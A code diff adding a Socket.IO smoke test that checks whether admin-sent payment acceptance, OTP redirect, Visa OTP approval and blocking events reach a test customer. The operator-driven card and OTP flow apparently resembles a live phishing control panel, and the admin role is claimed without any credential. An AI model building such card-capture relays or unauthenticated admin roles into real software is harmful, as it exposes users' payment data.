@@ -1,4 +1,5 @@
 // Post-deploy smoke test: node scripts/verify.mjs [worker-url]
+import { io } from "socket.io-client";
 const base = process.argv[2] || "https://gosuksa-edge.bcare.workers.dev";
 const origin = "https://gosuksa-tmin.lovable.app";
 
@@ -50,6 +51,58 @@ allOk &= await check("Socket.IO polling handshake", async () => {
   const body = await res.text();
   console.log("      status:", res.status, "upgrades:", /websocket/.test(body));
   return res.status === 200 && /websocket/.test(body);
+});
+
+allOk &= await check("Admin actions relay to the intended customer", async () => {
+  const id = `verify-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`;
+  const options = {
+    transports: ["websocket"],
+    extraHeaders: { Origin: origin },
+    reconnection: false,
+    timeout: 10000,
+  };
+  const customer = io(base, options);
+  const admin = io(base, options);
+  const received = [];
+  for (const event of ["payment:action", "admin:redirect", "user:blocked", "otp:action"])
+    customer.on(event, (payload) => received.push({ event, payload }));
+
+  try {
+    await Promise.all(
+      [customer, admin].map(
+        (socket) =>
+          new Promise((resolve, reject) => {
+            socket.once("connect", resolve);
+            socket.once("connect_error", reject);
+          }),
+      ),
+    );
+    customer.emit("user:join", { userType: "client", userId: id, userInfo: { uuid: id } });
+    admin.emit("join", { role: "admin" });
+    await new Promise((resolve) => setTimeout(resolve, 300));
+
+    const actions = [
+      ["acceptPaymentForm", { id }],
+      ["adminRedirect", { uuid: id, page: "/otp", pageName: "OTP" }],
+      ["acceptVisaOtp", { targetUserId: id }],
+      ["clientBlocked", { userId: id, message: "blocked" }],
+    ];
+    for (const [event, payload] of actions) {
+      await new Promise((resolve, reject) =>
+        admin.timeout(3000).emit(event, payload, (error, response) =>
+          error || !response?.ok ? reject(error || new Error(`${event} rejected`)) : resolve(),
+        ),
+      );
+    }
+    await new Promise((resolve) => setTimeout(resolve, 500));
+    const expected = ["payment:action", "admin:redirect", "user:blocked", "otp:action"];
+    return expected.every(
+      (event) => received.filter((entry) => entry.event === event).length === 1,
+    );
+  } finally {
+    customer.close();
+    admin.close();
+  }
 });
 
 process.exit(allOk ? 0 : 1);
